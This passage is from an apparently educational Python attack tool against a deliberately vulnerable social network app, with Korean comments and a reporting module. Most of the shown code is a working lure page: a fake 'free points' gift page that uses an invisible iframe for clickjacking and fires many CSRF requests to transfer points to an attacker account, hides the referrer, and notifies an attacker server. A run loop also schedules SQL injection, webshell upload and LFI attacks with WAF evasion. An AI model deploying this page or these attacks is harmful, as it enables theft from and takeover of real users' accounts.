        .clickjacking-container {{
            position: relative;
            width: 300px;
            height: 100px;
            margin: 20px auto;
        }}
        .legitimate-button {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 2;
            opacity: 0.001;
            cursor: pointer;
        }}
        #status {{
            background: #f0f0f0;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            color: #667eea;
            font-weight: bold;
            min-height: 60px;
        }}
    </style>
</head>
<body>
    <div class="gift-box">
        <div class="gift-icon">🎁</div>
        <h1>🎉 축하합니다!</h1>
        <p style="font-size: 1.5em;">10,000 포인트를 받으셨습니다!</p>
        <div id="status">자동으로 포인트를 받는 중...</div>
        
        <!-- Clickjacking 공격 -->
        <div class="clickjacking-container">
            <button>💰 포인트 받기 💰</button>
            <iframe class="legitimate-button" 
                    src="{self.base_url}/profile.php?send_gift=1&receiver_id={self.attacker_user_id}&points=10000"
                    frameborder="0">
            </iframe>
        </div>
    </div>
    
    <div id="csrfForms" style="display:none;"></div>
    
    <script>
        const ATTACKER_ID = '{self.attacker_user_id}';
        const TARGET_SNS = '{self.base_url}';
        const ATTACK_SERVER = '{self.attacker_server}';
        
        // 1. CSRF 토큰 추출 시도
        async function tryExtractCSRFToken() {{
            console.log('[*] Attempting CSRF token extraction...');
            
            // Method 1: XHR with credentials
            try {{
                const xhr = new XMLHttpRequest();
                xhr.open('GET', TARGET_SNS + '/profile.php', false);
                xhr.withCredentials = true;
                xhr.send();
                // 응답 상태 확인
                if (xhr.status === 200) {{
                    const match = xhr.responseText.match(/csrf_token['"]\s*value=['"]([^'"]+)/);
                    if (match) {{
                        console.log('[+] CSRF token found:', match[1]);
                        return match[1];
                    }}
                }}
            }} catch(e) {{
                console.log('[-] XHR method failed:', e);
            }}
            
            // Method 2: Fetch with no-cors
            try {{
                const response = await fetch(TARGET_SNS + '/profile.php', {{
                    credentials: 'include',
                    mode: 'no-cors'
                }});
                // Can't read response in no-cors mode, but request is sent
            }} catch(e) {{
                console.log('[-] Fetch method failed:', e);
            }}
            
            // Method 3: Image tag with error handler
            const img = new Image();
            img.src = TARGET_SNS + '/profile.php?csrf_token_check=1';
            
            return null;
        }}
        
        // 2. 다양한 CSRF 기법
        async function executeAdvancedCSRF() {{
            console.log('[*] Starting advanced CSRF attacks...');
            
            // 기법 1: 전통적인 Form 제출
            function classicFormCSRF() {{
                const amounts = [5000, 3000, 1000, 500, 300, 100];
                let formHTML = '';
                
                amounts.forEach((amount, index) => {{
                    formHTML += `
                        <form id="csrfForm${{index}}" method="POST" action="${{TARGET_SNS}}/profile.php" target="iframe${{index}}">
                            <input type="hidden" name="send_gift" value="1">
                            <input type="hidden" name="receiver_id" value="${{ATTACKER_ID}}">
                            <input type="hidden" name="gift_type" value="diamond">
                            <input type="hidden" name="points" value="${{amount}}">
                            <input type="hidden" name="message" value="Gift ${{amount}}P">
                        </form>
                        <iframe id="iframe${{index}}" name="iframe${{index}}" style="display:none"></iframe>
                    `;
                }});
                
                document.getElementById('csrfForms').innerHTML = formHTML;
                
                amounts.forEach((amount, index) => {{
                    setTimeout(() => {{
                        document.getElementById('csrfForm' + index).submit();
                        console.log('[+] Form CSRF:', amount + 'P');
                    }}, index * 300);
                }});
            }}
            
            // 기법 2: XHR/Fetch CSRF
            async function xhrCSRF() {{
                console.log('[*] Trying XHR CSRF...');
                
                // FormData CSRF
                const formData = new FormData();
                formData.append('send_gift', '1');
                formData.append('receiver_id', ATTACKER_ID);
                formData.append('points', '10000');
                
                try {{
                    await fetch(TARGET_SNS + '/profile.php', {{
                        method: 'POST',
                        body: formData,
                        credentials: 'include',
                        mode: 'no-cors'
                    }});
                    console.log('[+] FormData CSRF sent');
                }} catch(e) {{
                    console.log('[-] FormData CSRF failed:', e);
                }}
                
                // JSON CSRF
                try {{
                    await fetch(TARGET_SNS + '/api/transfer', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/json'}},
                        body: JSON.stringify({{
                            receiver_id: ATTACKER_ID,
                            points: 10000
                        }}),
                        credentials: 'include',
                        mode: 'no-cors'
                    }});
                    console.log('[+] JSON CSRF sent');
                }} catch(e) {{
                    console.log('[-] JSON CSRF failed:', e);
                }}
                
                // URL-encoded CSRF
                try {{
                    await fetch(TARGET_SNS + '/profile.php', {{
                        method: 'POST',
                        headers: {{'Content-Type': 'application/x-www-form-urlencoded'}},
                        body: 'send_gift=1&receiver_id=' + ATTACKER_ID + '&points=10000',
                        credentials: 'include',
                        mode: 'no-cors'
                    }});
                    console.log('[+] URL-encoded CSRF sent');
                }} catch(e) {{
                    console.log('[-] URL-encoded CSRF failed:', e);
                }}
            }}
            
            // 기법 3: GET 기반 CSRF
            function getCSRF() {{
                console.log('[*] Trying GET CSRF...');
                
                // Image tags
                const img1 = new Image();
                img1.src = TARGET_SNS + '/profile.php?send_gift=1&receiver_id=' + ATTACKER_ID + '&points=5000';
                
                // Script tags
                const script = document.createElement('script');
                script.src = TARGET_SNS + '/profile.php?action=transfer&to=' + ATTACKER_ID + '&amount=5000';
                document.body.appendChild(script);
                
                // Link prefetch
                const link = document.createElement('link');
                link.rel = 'prefetch';
                link.href = TARGET_SNS + '/profile.php?gift=' + ATTACKER_ID;
                document.head.appendChild(link);
                
                console.log('[+] GET CSRF elements injected');
            }}
            
            // 기법 4: 웹소켓 CSRF
            function websocketCSRF() {{
                try {{
                    const ws = new WebSocket('ws://' + TARGET_SNS.replace('http://', '') + '/ws');
                    ws.onopen = function() {{
                        ws.send(JSON.stringify({{
                            action: 'transfer',
                            to: ATTACKER_ID,
                            amount: 10000
                        }}));
                        console.log('[+] WebSocket CSRF sent');
                    }};
                }} catch(e) {{
                    console.log('[-] WebSocket CSRF failed:', e);
                }}
            }}
            
            // 실행
            const token = await tryExtractCSRFToken();
            
            classicFormCSRF();
            await xhrCSRF();
            getCSRF();
            websocketCSRF();
            
            // 공격 로깅
            fetch(ATTACK_SERVER + '/notify?event=advanced_csrf_executed&techniques=form,xhr,get,websocket')
                .catch(() => {{}});
        }}
        
        // 3. 방어 우회 기법
        function bypassDefenses() {{
            // Referer 헤더 우회
            const meta = document.createElement('meta');
            meta.name = 'referrer';
            meta.content = 'no-referrer';
            document.head.appendChild(meta);
            
            // X-Frame-Options 우회 시도
            if (window.top !== window.self) {{
                try {{
                    window.top.location = window.self.location;
                }} catch(e) {{
                    // Clickjacking 가능
                }}
            }}
            
            // SameSite 쿠키 우회 (POST -> GET 변환)
            // Modern browsers block this, but try anyway
        }}
        
        // 4. 실행
        window.onload = function() {{
            console.log('[*] Advanced CSRF attack page loaded');
            
            // 방어 우회
            bypassDefenses();
            
            // 공격 실행
            setTimeout(() => {{
                executeAdvancedCSRF();
            }}, 1000);
            
            // UI 업데이트
            document.getElementById('status').innerHTML = '🎯 포인트 전송 중...';
            
            setTimeout(() => {{
                document.getElementById('status').innerHTML = '✅ 완료! 포인트가 곧 지급됩니다.';
            }}, 5000);
        }};
    </script>
</body>
</html>"""
        
        with open("advanced-fake-gift.html", 'w', encoding='utf-8') as f:
            f.write(advanced_fake_gift_html)
        
        print(f"[+] advanced-fake-gift.html saved!")
        print(f"[+] Includes: CSRF token extraction, clickjacking, multiple CSRF methods")
        
        self.log_event(
            'SETUP',
            'Generated advanced CSRF attack page with multiple bypass techniques',
            'INFO',
            {
                'filename': 'advanced-fake-gift.html',
                'techniques': ['token_extraction', 'clickjacking', 'form_csrf', 'xhr_csrf', 'get_csrf', 'websocket_csrf'],
                'attacker_id': self.attacker_user_id
            }
        )
    
    # 기존 메서드들 오버라이드
    def test_sql_injection_login(self):
        """고급 SQL Injection 테스트로 대체"""
        return self.test_sql_injection_advanced()
    
    def test_file_upload_rce(self):
        """고급 파일 업로드 테스트로 대체"""
        return self.test_file_upload_advanced()
    
    def test_lfi(self):
        """고급 LFI 테스트로 대체"""
        return self.test_lfi_advanced()
    
    def test_xss_csrf_combined(self):
        """고급 CSRF 테스트로 대체"""
        return self.test_csrf_advanced()
    
    # 나머지 메서드들은 원본과 동일하게 유지
    def generate_html_report(self):
        """상세한 HTML 리포트 생성"""
        end_time = datetime.now()
        duration = (end_time - self.start_time).seconds
    
        total_vulns = sum(len(v) for v in self.vulnerabilities.values())
        critical_count = sum(1 for vuln_list in self.vulnerabilities.values() 
                            for vuln in vuln_list 
                            if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0)
        high_count = sum(1 for vuln_list in self.vulnerabilities.values() 
                        for vuln in vuln_list 
                        if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0)
    
        html_content = f"""<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>보안 진단 리포트 - Vulnerable SNS</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{
            font-family: 'Segoe UI', 'Malgun Gothic', sans-serif;
            background: #f5f7fa;
            padding: 40px 20px;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            box-shadow: 0 0 30px rgba(0,0,0,0.1);
        }}
        .header {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 40px;
        }}
        .header h1 {{
            font-size: 2.5em;
            margin-bottom: 10px;
        }}
        .header .meta {{
            opacity: 0.9;
            font-size: 0.95em;
        }}
        .summary {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            padding: 40px;
            background: #f8f9fa;
        }}
        .summary-box {{
            background: white;
            padding: 25px;
            border-radius: 12px;
            box-shadow: 0 2px 8px rgba(0,0,0,0.1);
            text-align: center;
        }}
        .summary-box .number {{
            font-size: 3em;
            font-weight: bold;
            margin-bottom: 10px;
        }}
        .summary-box .label {{
            color: #666;
            font-size: 0.9em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        .critical {{ color: #dc3545; }}
        .high {{ color: #fd7e14; }}
        .info {{ color: #17a2b8; }}
        .section {{
            padding: 40px;
        }}
        .section h2 {{
            font-size: 1.8em;
            margin-bottom: 20px;
            color: #333;
            border-bottom: 3px solid #667eea;
            padding-bottom: 10px;
        }}
        .vuln-card {{
            background: white;
            border: 1px solid #e0e0e0;
            border-left: 5px solid #dc3545;
            border-radius: 8px;
            padding: 25px;
            margin-bottom: 20px;
        }}
        .vuln-card.high {{
            border-left-color: #fd7e14;
        }}
        .vuln-card.medium {{
            border-left-color: #ffc107;
        }}
        .vuln-card h3 {{
            color: #333;
            font-size: 1.3em;
            margin-bottom: 15px;
        }}
        .vuln-detail {{
            background: #f8f9fa;
            padding: 15px;
            border-radius: 6px;
            margin: 10px 0;
            font-size: 0.9em;
        }}
        .vuln-detail strong {{
            color: #667eea;
        }}
        .cvss-badge {{
            display: inline-block;
            padding: 5px 12px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.85em;
            margin-left: 10px;
        }}
        .cvss-critical {{
            background: #dc3545;
            color: white;
        }}
        .cvss-high {{
            background: #fd7e14;
            color: white;
        }}
        .timeline {{
            position: relative;
            padding-left: 40px;
        }}
        .timeline::before {{
            content: '';
            position: absolute;
            left: 15px;
            top: 0;
            bottom: 0;
            width: 2px;
            background: #e0e0e0;
        }}
        .timeline-item {{
            position: relative;
            margin-bottom: 30px;
        }}
        .timeline-item::before {{
            content: '';
            position: absolute;
            left: -29px;
            top: 5px;
            width: 12px;
            height: 12px;
            border-radius: 50%;
            background: #667eea;
            border: 3px solid white;
            box-shadow: 0 0 0 2px #667eea;
        }}
        .timeline-item.critical::before {{
            background: #dc3545;
            box-shadow: 0 0 0 2px #dc3545;
        }}
        .timeline-item.high::before {{
            background: #fd7e14;
            box-shadow: 0 0 0 2px #fd7e14;
        }}
        .timeline-content {{
            background: white;
            padding: 15px;
            border-radius: 8px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
        }}
        .timeline-time {{
            color: #888;
            font-size: 0.85em;
            margin-bottom: 5px;
        }}
        .timeline-title {{
            font-weight: bold;
            color: #333;
            margin-bottom: 5px;
        }}
        .timeline-desc {{
            color: #666;
            font-size: 0.9em;
        }}
        .recommendations {{
            background: #fff3cd;
            border-left: 5px solid #ffc107;
            padding: 20px;
            border-radius: 8px;
            margin-top: 20px;
        }}
        .recommendations h3 {{
            color: #856404;
            margin-bottom: 15px;
        }}
        .recommendations ul {{
            list-style: none;
            padding-left: 0;
        }}
        .recommendations li {{
            padding: 8px 0;
            color: #856404;
        }}
        .recommendations li::before {{
            content: '✓ ';
            color: #28a745;
            font-weight: bold;
            margin-right: 8px;
        }}
        .footer {{
            background: #2d3436;
            color: white;
            text-align: center;
            padding: 30px;
        }}
        code {{
            background: #f4f4f4;
            padding: 2px 6px;
            border-radius: 3px;
            font-family: 'Courier New', monospace;
            font-size: 0.9em;
        }}
        @media print {{
            .no-print {{ display: none; }}
            body {{ background: white; }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 웹 애플리케이션 보안 진단 리포트</h1>
            <div class="meta">
                <p><strong>대상 시스템:</strong> {self.base_url}</p>
                <p><strong>진단 일시:</strong> {self.start_time.strftime('%Y년 %m월 %d일 %H:%M:%S')}</p>
                <p><strong>소요 시간:</strong> {duration}초</p>
                <p><strong>진단 도구:</strong> VulnerableSNS Security Assessment Tool v1.0</p>
            </div>
        </div>

        <div class="summary">
            <div class="summary-box">
                <div class="number critical">{total_vulns}</div>
                <div class="label">총 취약점 수</div>
            </div>
            <div class="summary-box">
                <div class="number critical">{critical_count}</div>
                <div class="label">치명적 (Critical)</div>
            </div>
            <div class="summary-box">
                <div class="number high">{high_count}</div>
                <div class="label">높음 (High)</div>
            </div>
            <div class="summary-box">
                <div class="number info">{len(self.attack_timeline)}</div>
                <div class="label">공격 시도 횟수</div>
            </div>
        </div>

        <div class="section">
            <h2>📊 Executive Summary (경영진 요약)</h2>
            <p style="line-height: 1.8; color: #555; margin-bottom: 20px;">
                본 보안 진단에서는 대상 웹 애플리케이션에서 <strong class="critical">{total_vulns}개의 보안 취약점</strong>이 발견되었습니다. 
                이 중 <strong class="critical">{critical_count}개는 치명적(Critical)</strong> 수준으로, 즉각적인 조치가 필요합니다.
                주요 취약점으로는 <strong>SQL Injection, 파일 업로드 취약점(RCE), CSRF, XSS, LFI</strong> 등이 확인되었으며, 
                이를 통해 <strong>인증 우회, 원격 코드 실행, 사용자 계정 탈취</strong> 등이 가능한 상태입니다.
            </p>
            <p style="line-height: 1.8; color: #555;">
                <strong>권고사항:</strong> 발견된 모든 취약점에 대한 즉각적인 패치 작업이 필요하며, 
                특히 Critical 등급의 취약점은 24시간 이내에 수정되어야 합니다.
            </p>
        </div>

        <div class="section">
            <h2>🔴 발견된 취약점 상세 분석</h2>
"""

        # SQL Injection 취약점
        if self.vulnerabilities['sql_injection']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">1️⃣ SQL Injection (SQLi)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['sql_injection'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>SQL Injection #{idx} - 인증 우회
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong><br>
                    Username: <code>{vuln['username']}</code><br>
                    Password: <code>{vuln['password']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 기법:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>Prepared Statement (파라미터화된 쿼리) 사용</li>
                        <li>입력값 검증 및 화이트리스트 기반 필터링</li>
                        <li>ORM (Object-Relational Mapping) 프레임워크 사용</li>
                        <li>최소 권한 원칙에 따른 DB 계정 설정</li>
                    </ul>
                </div>
            </div>
"""

        # File Upload 취약점
        if self.vulnerabilities['file_upload']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">2️⃣ Unrestricted File Upload (파일 업로드 취약점)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['file_upload'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>File Upload RCE #{idx} - 원격 코드 실행
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>업로드 URL:</strong> <code>{vuln['upload_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>업로드된 웹쉘:</strong> <code>{vuln['filename']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>테스트 명령:</strong> <code>{vuln['command']}</code><br>
                    <strong>실행 결과:</strong> <code>{vuln['output']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>접근 URL:</strong> <code>{vuln['access_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>화이트리스트 기반 확장자 검증 (블랙리스트 방식 지양)</li>
                        <li>파일 MIME 타입 검증 (Magic Number 확인)</li>
                        <li>업로드 파일을 웹 루트 외부에 저장</li>
                        <li>업로드 파일명 랜덤화 및 실행 권한 제거</li>
                        <li>파일 크기 제한 설정</li>
                    </ul>
                </div>
            </div>
"""

        # LFI 취약점
        if self.vulnerabilities['lfi']:
            html_content += """
            <h3 style="color: #fd7e14; margin-top: 30px;">3️⃣ Local File Inclusion (LFI)</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['lfi'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-high'
                html_content += f"""
            <div class="vuln-card high">
                <h3>LFI #{idx} - 임의 파일 읽기
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 페이로드:</strong> <code>{vuln['payload']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>읽은 파일:</strong> {vuln['description']}
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>파일 경로를 사용자 입력에서 직접 가져오지 않기</li>
                        <li>화이트리스트 기반 파일명 검증</li>
                        <li>realpath() 함수로 정규화된 경로 확인</li>
                        <li>basename() 사용하여 디렉토리 순회 방지</li>
                        <li>chroot jail 또는 open_basedir 설정</li>
                    </ul>
                </div>
            </div>
"""

        # XSS/CSRF 취약점
        if self.vulnerabilities['xss']:
            html_content += """
            <h3 style="color: #dc3545; margin-top: 30px;">4️⃣ Cross-Site Request Forgery (CSRF) + XSS</h3>
"""
            for idx, vuln in enumerate(self.vulnerabilities['xss'], 1):
                cvss = vuln.get('cvss_score', 0)
                cvss_class = 'cvss-critical' if cvss >= 9.0 else 'cvss-high'
                html_content += f"""
            <div class="vuln-card">
                <h3>CSRF #{idx} - 사용자 권한 도용
                    <span class="cvss-badge {cvss_class}">CVSS {cvss}</span>
                </h3>
                <div class="vuln-detail">
                    <strong>취약 URL:</strong> <code>{vuln['url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>공격 유형:</strong> {vuln['attack_type']}
                </div>
                <div class="vuln-detail">
                    <strong>공격자 서버:</strong> <code>{vuln['target_url']}</code>
                </div>
                <div class="vuln-detail">
                    <strong>페이로드 내용:</strong><br>
                    <code style="display: block; white-space: pre-wrap; padding: 10px; background: #f8f9fa;">
{vuln['payload'][:200]}...</code>
                </div>
                <div class="vuln-detail">
                    <strong>영향도:</strong> {vuln['impact']}
                </div>
                <div class="recommendations">
                    <h3>🔧 수정 방안</h3>
                    <ul>
                        <li>CSRF 토큰 구현 및 검증 (모든 상태 변경 요청에 적용)</li>
                        <li>SameSite 쿠키 속성 설정</li>
                        <li>Referer/Origin 헤더 검증</li>
                        <li>중요한 작업에 재인증 요구</li>
                        <li>GET 요청으로 상태 변경 금지</li>
                        <li>XSS 방어: 출력 시 htmlspecialchars() 사용</li>
                        <li>Content Security Policy (CSP) 헤더 설정</li>
                    </ul>
                </div>
            </div>
"""

        # 공격 타임라인
        html_content += """
        </div>

        <div class="section">
            <h2>⏱️ 공격 타임라인</h2>
            <div class="timeline">
"""
        for event in self.attack_timeline:
            severity_class = event['severity'].lower()
            html_content += f"""
                <div class="timeline-item {severity_class}">
                    <div class="timeline-content">
                        <div class="timeline-time">{event['timestamp']}</div>
                        <div class="timeline-title">[{event['severity']}] {event['type']}</div>
                        <div class="timeline-desc">{event['description']}</div>
                    </div>
                </div>
"""
        
        html_content += """
            </div>
        </div>

        <div class="section">
            <h2>📋 종합 권고사항</h2>
            <div class="recommendations" style="border-left-color: #dc3545;">
                <h3>🚨 긴급 조치 필요 (24시간 이내)</h3>
                <ul>
                    <li>SQL Injection 취약점: Prepared Statement로 모든 쿼리 재작성</li>
                    <li>파일 업로드 취약점: 업로드 기능 일시 중단 또는 화이트리스트 검증 적용</li>
                    <li>CSRF 취약점: CSRF 토큰 즉시 적용 (profile.php, new_post.php 등)</li>
                </ul>
            </div>
            
            <div class="recommendations" style="border-left-color: #fd7e14; background: #fff3e0; margin-top: 20px;">
                <h3 style="color: #e65100;">⚠️ 우선순위 높음 (1주일 이내)</h3>
                <ul style="color: #e65100;">
                    <li>LFI 취약점: 파일 경로 검증 로직 강화</li>
                    <li>XSS 취약점: 모든 사용자 입력 출력 시 이스케이프 처리</li>
                    <li>세션 관리: HttpOnly, Secure 플래그 설정</li>
                    <li>에러 메시지: 상세 정보 노출 제거</li>
                </ul>
            </div>

            <div class="recommendations" style="border-left-color: #2196f3; background: #e3f2fd; margin-top: 20px;">
                <h3 style="color: #1565c0;">💡 장기 개선 사항</h3>
                <ul style="color: #1565c0;">
                    <li>웹 애플리케이션 방화벽(WAF) 도입</li>
                    <li>보안 코드 리뷰 프로세스 수립</li>
                    <li>정기적인 보안 진단 및 침투 테스트 실시</li>
                    <li>개발자 보안 교육 프로그램 운영</li>
                    <li>보안 로깅 및 모니터링 체계 구축</li>
                </ul>
            </div>
        </div>

        <div class="footer">
            <p>본 리포트는 교육 목적으로 생성되었습니다.</p>
            <p>VulnerableSNS Security Assessment Tool v1.0</p>
            <p>© 2024 Security Research Team</p>
        </div>
    </div>
</body>
</html>
"""
        
        # HTML 파일 저장
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html"
        with open(report_filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        print(f"\n[+] HTML Report saved: {report_filename}")
        return report_filename

    def generate_json_report(self):
        """JSON 리포트 생성"""
        report = {
            'metadata': {
                'target': self.base_url,
                'attacker_server': self.attacker_server,
                'start_time': self.start_time.strftime('%Y-%m-%d %H:%M:%S'),
                'end_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'duration_seconds': (datetime.now() - self.start_time).seconds,
                'attacker_user_id': self.attacker_user_id,
                'tool_version': '1.0'
            },
            'summary': {
                'total_vulnerabilities': sum(len(v) for v in self.vulnerabilities.values()),
                'critical_count': sum(1 for vuln_list in self.vulnerabilities.values() 
                                    for vuln in vuln_list 
                                    if 'cvss_score' in vuln and vuln['cvss_score'] >= 9.0),
                'high_count': sum(1 for vuln_list in self.vulnerabilities.values() 
                                for vuln in vuln_list 
                                if 'cvss_score' in vuln and 7.0 <= vuln['cvss_score'] < 9.0),
                'vulnerability_breakdown': {
                    'sql_injection': len(self.vulnerabilities['sql_injection']),
                    'file_upload': len(self.vulnerabilities['file_upload']),
                    'lfi': len(self.vulnerabilities['lfi']),
                    'xss': len(self.vulnerabilities['xss']),
                    'csrf': len(self.vulnerabilities['csrf'])
                }
            },
            'vulnerabilities': self.vulnerabilities,
            'attack_timeline': self.attack_timeline,
            'artifacts': {
                'uploaded_webshell': self.uploaded_webshell,
                'fake_gift_page': 'advanced-fake-gift.html'
            }
        }
        
        report_filename = f"security_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print(f"[+] JSON Report saved: {report_filename}")
        return report_filename

    def run_assessment(self):
        """전체 평가 실행"""
        print("\n" + "="*60)
        print("Advanced Vulnerable SNS - Security Assessment")
        print("="*60)
        print(f"Target: {self.base_url}")
        print(f"Attacker Server: {self.attacker_server}")
        print(f"Stealth Mode: {'ON' if self.stealth_mode else 'OFF'}")
        print("="*60)
        
        self.log_event('SCAN_START', f'Advanced security assessment started on {self.base_url}', 'INFO')
        
        # 1. Advanced SQL Injection
        print("\n[Phase 1: SQL Injection with WAF Bypass]")
        self.add_delay(2, 4)
        self.test_sql_injection_advanced()
        
        if not self.logged_in:
            print("\n[-] Login failed. Cannot continue.")
            self.log_event('SCAN_FAILED', 'Unable to gain access to the system', 'ERROR')
            return
        
        # 2. Advanced File Upload
        print("\n[Phase 2: File Upload with Multiple Bypass Techniques]")
        self.add_delay(2, 4)
        self.test_file_upload_advanced()
        
        # 3. Advanced LFI
        print("\n[Phase 3: LFI with Filter Evasion]")
        self.add_delay(2, 4)
        self.test_lfi_advanced()
        
        # 4. Advanced CSRF
        print("\n[Phase 4: CSRF with Defense Bypass]")
        self.add_delay(2, 4)
        self.test_csrf_advanced()
        
        # 5. Generate attack pages
        self.generate_advanced_fake_gift_page()
        
        self.log_event('SCAN_COMPLETE', f'Advanced assessment completed. {sum(len(v) for v in self.vulnerabilities.values())} vulnerabilities found', 'INFO')
        
        # 6. Generate reports
        self.print_section("Generating Reports")
        html_report = self.generate_html_report()
        json_report = self.generate_json_report()
        
        # Console summary
        self.print_report()
        
        print(f"\n[+] Advanced assessment complete!")
        print(f"[+] HTML Report: {html_report}")
        print(f"[+] JSON Report: {json_report}")
        print(f"[+] Attack pages: advanced-fake-gift.html")
        print(f"[+] Total evasion techniques used: {len(self.encoding_methods) + len(self.user_agents)}")
    
    def print_report(self):
        """콘솔 요약 출력"""
        self.print_section("Advanced Assessment Summary")
        
        total = sum(len(v) for v in self.vulnerabilities.values())
        print(f"\n✓ Total vulnerabilities found: {total}\n")
        
        for vuln_type, vulns in self.vulnerabilities.items():
            if vulns:
                print(f"\n[{vuln_type.upper()}] - {len(vulns)} found")
                print("-" * 60)
                for i, vuln in enumerate(vulns, 1):
                    print(f"{i}. {vuln.get('description', vuln.get('type', 'N/A'))}")
                    if 'waf_bypass_technique' in vuln:
                        print(f"   WAF Bypass: {vuln['waf_bypass_technique']}")
                    if 'bypass_technique' in vuln:
                        print(f"   Bypass: {vuln['bypass_technique']}")
                    if 'cvss_score' in vuln:
                        print(f"   CVSS Score: {vuln['cvss_score']}")
                    if 'impact' in vuln:
                        print(f"   Impact: {vuln['impact']}")
                    print()


if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 3:
        print("Usage: python3 advanced_attacker.py <target_url> <attacker_server> [--stealth]")
        print("Example: python3 advanced_attacker.py http://target.com/sns http://attacker.com:5000 --stealth")
        sys.exit(1)
    
    target = sys.argv[1]
    attacker_server = sys.argv[2]
    stealth_mode = '--stealth' in sys.argv
    
    attacker = AdvancedVulnerableSNSAttacker(target, attacker_server, stealth_mode)
    attacker.run_assessment()
    
    print("\n" + "="*60)
    print("✅ Advanced assessment completed successfully!")
    print(f"🛡️ WAF bypasses attempted: SQL, File Upload, LFI, CSRF")
    print(f"📊 Check the generated reports for detailed findings")
    print(f"🎯 Monitor attacks at: {attacker_server}")
    print("="*60)